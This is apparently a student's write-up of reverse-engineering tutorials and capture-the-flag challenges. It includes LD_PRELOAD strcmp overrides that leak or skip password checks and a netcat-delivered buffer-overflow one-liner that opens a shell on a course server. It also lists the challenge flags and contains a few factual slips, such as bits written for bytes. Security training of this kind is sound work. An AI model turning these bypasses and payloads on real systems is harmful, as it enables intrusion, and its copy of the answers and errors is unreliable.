## Exploration Tools - Tutorials & Challenges Answers

### Tutorials:

---
### 01. Poor Man's Technique:

`strings` command is used when we only have access to the executabile file, without the source code (eg: in `C`, `C++`). In the `crackme1` executable, if we run the command:

```bash
strings crackme1
```
Then only the sections from ``.data`` and ``.rodata`` are shown. If we run the command:

```bash
strings -a crackme1
```
This forces the utilitary to scan the entire file, ignoring the internal structure of the binary file. This means that also the data from ``.text`` will be shown. Hardcoded strings will be therefore shown.

### 02. Execution Tracing (ltrace and strace):

- `ltrace` = lists library function calls or syscalls made by a program
- `strace` = lists syscalls made by a program

In order to see which one of these two commands works best for our binary, we will check whether it is statically or dynamically linked, we do that by using the command ``file``.

```bash
file crackme2
```
If the binary is dynamically linked (``.so``), we use ``ltrace``. If the binary is statically linked (`.a`), we use ``strace``.

### 03. Symbols - nm:

**Obfuscation** is a process done intentionally by a human through existing tools (``ProGuard`` / ``Java``, ``OLLVM``/ ``C++``) in order to make a source code or a binary hard to interpret and analyse.

**Deobfuscation** is the process made my humans when they are trying to remake the code easy to understand and read; when we get the decompiled code from Ghidra we will get each function with random names, crypted strings that we will try to change for an easily understanding of the code.

```bash
$ nm crackme3 | grep pass
0804a02c D correct_pass
$ gdb -n ./crackme3
Reading symbols from ./crackme3...(no debugging symbols found)...done.
(gdb) run
Password:
^C
Program received signal SIGINT, Interrupt.
0xf7fdb430 in __kernel_vsyscall ()
(gdb) x/s 0x0804a02c
0x804a02c <correct_pass>:    "JWxb7gE2pjiY3gRG8U"
```

We enter `gdb` and after we run the program we ``^C`` to receive ``SIGINT``, because in this way the program is freezed in it`s current state, otherwise if we would write a random password we would get a invalid match and the program would close, the address ``0x0804a02c`` would be invalid.

### 04. Library Dependencies:

It's used when we come across **Library Hijacking** attacks.

The shared library it's a huge file that is located on the hard disk. When we load the executable, the operating system opens the **Linux dynamic linker/loader** and then looks into the header of the binary and sees which functions he needs. Then it has the following searching criteria in the kernel:

1) ``DT_RPATH`` (deprecated) = a path to a directory saved by the programmer directly into the binary, in the `.dinamic` section, in the compiling stage. It can't be overwritten afterwards.

2) ``LD_LIBRARY_PATH`` (medium variable) = a medium variable set by the user, here you can write the path to a custom directory where you saved the libraries.

If we have special rights like `setuid` or `setgid`, we ignore the ``LD_LIBRARY_PATH``. How do we check that?

Binary **without** SETUID:
```bash
$ ls -l /bin/ls
-rwxr-xr-x 1 root root 142144 Jan 18 12:00 /bin/ls
```

Binary **with** SETUID:
```bash
$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 Jan 18 12:00 /usr/bin/passwd
```

That ``s`` is the indicator that we came accross a SETUID binary, meaning it has root facilities; the dynamic linker will sense the danger and will ignore ``LD_LIBRARY_PATH``.

3) ``DT_RUNPATH`` = also a path saved in the binary, but unlike ``DT_RPATH`` this is checked after the ``LD_LIBRARY_PATH`` and can be overwritten.

4) ``/etc/ld.so.cache`` = a cache generated automatically by the `ldconfig` command, which contains a list with all the standard libraries from the system and their addresses.

5) `/lib` and `/usr/lib` = if these steps above did not get any answer, we look into these standard folders of the operating system, where we find the base libraries.

`-z nodeflib` forces the linker to avoid the implicit libraries of the system, to only look at the ones specified explicitly.

#### Lazy Binding:

Unlike variables, whose addresses are determined immediately after the programme starts, the function from the external libraries (`puts`, `fgets`, `strcmp`) **don`t** have an address at the beggining.

The dynamic linker uses a **lazy** approach, it doesn't look at the address of a function until it has been called for the first time.

```bash
$ LD_DEBUG=symbols,bindings ./crackme2
...
     11480:    initialize program: ./crackme2
     11480:
     11480:
     11480:    transferring control: ./crackme2
     11480:
     11480:    symbol=puts;  lookup in file=./crackme2 [0]
     11480:    symbol=puts;  lookup in file=/lib32/libc.so.6 [0]
     11480:    binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol 'puts' [GLIBC_2.0]
Password:
     11480:    symbol=fgets;  lookup in file=./crackme2 [0]
     11480:    symbol=fgets;  lookup in file=/lib32/libc.so.6 [0]
     11480:    binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol 'fgets' [GLIBC_2.0]
I_pity_da_fool_who_gets_here_without_solving_crackme2
     11480:    symbol=strlen;  lookup in file=./crackme2 [0]
     11480:    symbol=strlen;  lookup in file=/lib32/libc.so.6 [0]
     11480:    binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol 'strlen' [GLIBC_2.0]
     11480:    symbol=strcmp;  lookup in file=./crackme2 [0]
     11480:    symbol=strcmp;  lookup in file=/lib32/libc.so.6 [0]
     11480:    binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol 'strcmp' [GLIBC_2.0]
Nope!
     11480:
     11480:    calling fini: ./crackme2 [0]
     11480:
```
So when we run a binary, first we have a look at the `.dinamic` part to see what libraries will be needed, then we look for them by following the order written above. Finally, we put it in the RAM Memory, without knowing at what address each function needed it's stored. That's why when in the example above we find the function `puts`, the compiler looks if we have it overwritten in the binary, and if that's not the case we look in libraries loaded by the linker. In the end, the address where the function is found in the library is stored in the GOT (Global Offset Table)

In the given tutorial, we link the `crackme2` executable with our custom `strcmp.c` function. In order to find the flag, we have two ways:

1. Leak the password in the strcmp() wrapper.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>

int strcmp(const char *a, const char *b)
{
	int result;
	int (*original_strcmp)(const char *, const char *);
	original_strcmp = dlsym(RTLD_NEXT, "strcmp");
	printf(" %s/n", a);
	printf(" %s/n", b);
	result = original_strcmp(a, b);

	return result;
}
```

By printing both of the strings sent for comparison from the `strcmp` function, we find the flag when we run the executable.

```bash
gcc -Wall -fPIC -c strcmp.c
gcc -Wall -fPIC -shared -o libstrcmp.so strcmp.o -ldl
LD_PRELOAD=./libstrcmp.so ../../02-tutorial-execution-tracing/src/crackme2
Password:
aa
aa/nDBTEUw0s3zMGa1CASU2ag8/nNope! -> DBTEUw0s3zMGa1CASU2ag8
```

2. Pass the check regardless of what password we provide.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>

int strcmp(const char *a, const char *b)
{
	return 0;
}
```
We make the `strcmp.c` function so that it always returns 0 (which means the strings are equal).

```bash
gcc -Wall -fPIC -c strcmp.c
gcc -Wall -fPIC -shared -o libstrcmp.so strcmp.o -ldl
LD_PRELOAD=./libstrcmp.so ../../02-tutorial-execution-tracing/src/crackme2
Password:
a
Correct!
```

```c
#define _GNU_SOURCE
#include <dlfcn.h>
```

These are necessary each time we have to overwrite a function.

### 05. Network - netstat and netcat:

1. netstat

```bash
$ netstat -tlpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:35961         0.0.0.0:*               LISTEN      488755/node
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:31337         0.0.0.0:*               LISTEN      619279/./server
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      0 10.255.255.254:53       0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8181            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::8888                 :::*                    LISTEN      -
tcp6       0      0 :::8181                 :::*                    LISTEN      -
```

From the instruction above, we could see that the `./server` is `LISTENING` on port number `31317`.

2. netcat

```bash
netcat localhost 31337
```
This command binds me a new `client` to an existing port (`31337`)

```bash
nc -l -p 4444
```
This command creates me a `server` connected to a new port where `-l` means the server is listening and `-p` is used to write the port.

### 06. Open files - lsof:

```bash
$ lsof -c server
COMMAND  PID   USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
server  9678 amadan  cwd    DIR    8,6     4096 1482770 /home/amadan/projects/sss/session01/crackmes/crackme5
server  9678 amadan  rtd    DIR    8,6     4096       2 /
server  9678 amadan  txt    REG    8,6    17524 1442625 /home/amadan/projects/sss/session01/crackmes/crackme5/server
server  9678 amadan  mem    REG    8,6  1753240 3039007 /lib64/libc-2.17.so
server  9678 amadan  mem    REG    8,6    88088 3039019 /lib64/libnsl-2.17.so
server  9678 amadan  mem    REG    8,6   144920 3038998 /lib64/ld-2.17.so
server  9678 amadan    0u   CHR  136,2      0t0       5 /dev/pts/2
server  9678 amadan    1u   CHR  136,2      0t0       5 /dev/pts/2
server  9678 amadan    2u   CHR  136,2      0t0       5 /dev/pts/2
server  9678 amadan    3u  IPv4 821076      0t0     TCP *:31337 (LISTEN)
```
`lsof` shows all the files that a process has opened.

---

### Challenges

---

### 07. Perfect Answer:

```c
undefined8 main(void)

{
  int iVar1;
  int iVar2;
  void *__buf;
  ssize_t sVar3;
  long in_FS_OFFSET;
  undefined1 local_118 [264];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  seed_rng();
  puts("Generating the 2nd flag");
  iVar1 = rand();
  iVar2 = iVar1 % 10 + 5;
  __buf = (void *)gen_rand_str((long)iVar2);
  write(0x2a,__buf,(long)(iVar1 % 10 + 6));
  puts("Generated! Can you guess it this time?");
  sVar3 = read(0,local_118,0x100);
  if (sVar3 == -1) {
    perror("");
    fprintf(stderr,"[%d] Something went wrong with %s; contact admin!",0x30,&DAT_00102087);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (sVar3 + -1 == (long)iVar2) {
    iVar1 = memcmp(local_118,__buf,(long)iVar2);
    if (iVar1 == 0) {
      puts("L33t $killz bro!");
      system("/bin/sh");
    }
    else {
      puts("Nope");
    }
  }
  else {
    puts("Seriously?");
  }
  free(__buf);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
This `Ghidra` code lead me to think that I have to enter the `/bin/sh` bash, in order to do that I firstly checked with `file` what type of executable I have. I found out I have a dynamically linked executable and found out with `ltrace` that the password is leaked and opened the bash in this way.

```bash
gettimeofday(0x7ffd093e47e0, 0)                                                                    = 0
srand(0x8e33, 0, 0x176e72e, 23)                                                                    = 1
puts("Generating the 2nd flag"Generating the 2nd flag
)                                                                    = 24
rand(0x7f6735949710, 0x562cf10642a0, 0, 0x7f67358605a4)                                            = 0x49e30de6
malloc(15)                                                                                         = 0x562cf10646b0
rand(0x562cf10646b0, 15, 0, 0x562cf10646c0)                                                        = 0x1649f03a
rand(0x7f67359476a0, 0x7ffd093e47b4, 115, 115)                                                     = 0x62973997
rand(0x7f67359476a0, 0x7ffd093e47b4, 98, 98)                                                       = 0x2fd22c82
rand(0x7f67359476a0, 0x7ffd093e47b4, 75, 75)                                                       = 0x368741b0
rand(0x7f67359476a0, 0x7ffd093e47b4, 79, 79)                                                       = 0x13a550a1
rand(0x7f67359476a0, 0x7ffd093e47b4, 68, 68)                                                       = 0x5bb2ee4e
rand(0x7f67359476a0, 0x7ffd093e47b4, 119, 119)                                                     = 0x5f20e410
rand(0x7f67359476a0, 0x7ffd093e47b4, 75, 75)                                                       = 0x79c936cc
rand(0x7f67359476a0, 0x7ffd093e47b4, 107, 107)                                                     = 0x6f4819e2
rand(0x7f67359476a0, 0x7ffd093e47b4, 97, 97)                                                       = 0x179d3161
rand(0x7f67359476a0, 0x7ffd093e47b4, 68, 68)                                                       = 0x75138b57
rand(0x7f67359476a0, 0x7ffd093e47b4, 68, 68)                                                       = 0x4d6dad70
rand(0x7f67359476a0, 0x7ffd093e47b4, 97, 97)                                                       = 0x3aa559f7
write(42, "sbKODwKkaDDaj\n", 14)                                                                   = -1
puts("Generated! Can you guess it this"...Generated! Can you guess it this time?
)                                                        = 39
read(0sbKODwKkaDDaj
, "sbKODwKkaDDaj\n", 256)                                                                    = 14
memcmp(0x7ffd093e4830, 0x562cf10646b0, 13, 0x562cf10646b0)                                         = 0
puts("L33t $killz bro!"L33t $killz bro!
)                                                                           = 17
system("/bin/sh"
$ ls
perfect-answer
```

### 08. Lots of strings:

Considering the fact that in the main function there is a variable named ``password``, I used the `nm` utilitary and then with the address I got I went in `gdb` and ran the program, and after typing the ``x/s 0xaddr`` command, I found out the flag.

### 09. Sleepy cats:

I opened `Ghidra` and found out I had the following main function:

```c
undefined4 main(void)

{
  uint local_14;

  sleep(0x9999);
  for (local_14 = 0; local_14 < 0x19; local_14 = local_14 + 1) {
    putchar(*(int *)(num_array + local_14 * 4));
  }
  putchar(10);
  return 0;
}
```

I then realised that in order to catch the flag I had to skip that `sleepy(0x9999)` command. With `LD_DEBUG` I looked which function sleepy called, and found out I had to write my custom `sleep` function.

```bash
    651406:     initialize program: ./sleepy
    651406:
    651406:
    651406:     transferring control: ./sleepy
    651406:
    651406:     symbol=sleep;  lookup in file=./sleepy [0]
    651406:     symbol=sleep;  lookup in file=/lib/i386-linux-gnu/libc.so.6 [0]
```
After I wrote my custom function, I had to force the executable to first look at it. In order to do that, I wrote the commands:
```bash
gcc -m32 -shared -fPIC -o sleepy.so sleepy.c -> I used -m32 because I checked with file that the executable was an ELF32CLASS
LD_PRELOAD=./sleepy.so ./sleepy
```
After these commands, the flag was found.

### 10. Hidden:

Used the `ltrace` utilitary and captured the flag.

### 11. Detective:

Here we had two flags to capture:

1. `SSS{what_is_more_meaningful_than_your_own_strength}`

I went on `Ghidra` and followed the main function flow. I realised it called the `read_and_compare` function, which looked like this:

```c
void read_and_compare(void)

{
  int iVar1;
  char buffer [64];

  fgets(buffer,0x400,stdin);
  iVar1 = strncmp(buffer,"gimme gimme",0xb);
  if (iVar1 == 0) {
    read_flag();
  }
  return;
}
```

Knowing that i had to connect on ``141.85.224.104:31337 ``, using netcat and the `gimme gimme` string, after running this command, the flag was shown.

```bash
echo "gimme gimme" | nc 141.85.224.104 31337
Well done, here's your flag: SSS{what_is_more_meaningful_than_your_own_strength}
There is another flag. Can you get it?
```

2. `SSS{a_pair_of_new_boots_size_9_please}`

Knowing that I had a second flag to find, I looked in `Ghidra` and found the `nononono` function, which was not showing in the flow of the main. I saw that in `read_and_compare` we had a buffer of 64 bits, and with 8 from rbp = 72 bits.

After running the command, a bash opened and I found the second flag.

```bash
(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\xd7\x06\x40\x00\x00\x00\x00\x00\n")'; cat -) | nc 141.85.224.104 31337
```
